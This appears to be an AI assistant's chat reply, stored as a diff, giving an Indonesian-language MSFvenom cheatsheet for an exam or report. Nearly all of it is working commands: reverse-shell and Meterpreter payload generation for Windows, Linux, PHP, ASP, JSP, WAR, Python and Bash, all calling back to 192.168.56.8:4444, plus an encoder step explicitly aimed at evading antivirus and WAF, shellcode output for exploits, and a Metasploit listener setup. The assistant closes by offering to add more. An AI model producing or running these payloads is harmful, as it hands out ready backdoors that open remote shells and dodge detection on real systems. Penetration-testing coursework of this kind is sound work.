@@ -1,0 +1,108 @@
+Oke 👍 ini **MSFvenom Cheatsheet** dalam format **plain text** supaya gampang dipakai saat ujian atau laporan.
+
+---
+
+# MSFVENOM CHEATSHEET
+
+1. Dasar MSFvenom
+
+---
+
+MSFvenom digunakan untuk membuat payload (shellcode, backdoor) yang bisa dipakai dengan Metasploit handler.
+Format umum:
+msfvenom -p <payload> LHOST=<attacker-ip> LPORT=<port> -f <format> -o <outputfile>
+
+Parameter penting:
+
+* -p   → pilih payload
+* LHOST → IP attacker (misal IP Kali)
+* LPORT → port listener
+* -f   → format file (exe, elf, php, asp, war, raw, c, py, dll)
+* -o   → output file
+
+2. Windows Payload
+
+---
+
+Reverse TCP Meterpreter (EXE):
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f exe -o shell.exe
+
+Staged reverse shell (EXE):
+msfvenom -p windows/shell/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f exe -o shell.exe
+
+3. Linux Payload
+
+---
+
+Reverse TCP Meterpreter (ELF):
+msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f elf -o shell.elf
+
+Simple reverse shell (ELF):
+msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f elf -o shell.elf
+
+4. Web Payload
+
+---
+
+PHP Reverse Shell:
+msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f raw -o shell.php
+
+ASP Reverse Shell:
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f asp -o shell.asp
+
+JSP Reverse Shell (Tomcat/Java app):
+msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f raw -o shell.jsp
+
+WAR Reverse Shell (deploy ke Tomcat):
+msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f war -o shell.war
+
+5. Script Payload
+
+---
+
+Python Reverse Shell:
+msfvenom -p python/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f raw -o shell.py
+
+Bash Reverse Shell:
+msfvenom -p cmd/unix/reverse\_bash LHOST=192.168.56.8 LPORT=4444 -f raw -o shell.sh
+
+6. Payload Encoder / Obfuscation
+
+---
+
+Gunakan encoder untuk menghindari AV/WAF:
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f exe -e x86/shikata\_ga\_nai -i 5 -o shell\_encoded.exe
+
+7. Generate Shellcode (untuk disisipkan ke exploit)
+
+---
+
+C format:
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f c
+
+Python format:
+msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=192.168.56.8 LPORT=4444 -f python
+
+8. Listener dengan Metasploit
+
+---
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse\_tcp
+set LHOST 192.168.56.8
+set LPORT 4444
+exploit
+
+9. Tips Penting
+
+---
+
+* Pilih payload sesuai target OS (windows, linux, php, asp, java, cmd/unix).
+* Sesuaikan format output dengan target (exe, elf, php, jsp, war).
+* Listener harus sama dengan payload (reverse\_tcp → handler reverse\_tcp).
+* Gunakan encoder (-e) jika payload terdeteksi AV.
+* Simpan semua payload di satu folder agar mudah dipanggil saat ujian.
+
+---
+
+Mau saya tambahkan juga **cheatsheet exploit/multi/handler** (step-by-step untuk menerima koneksi dari payload MSFvenom) biar satu paket?
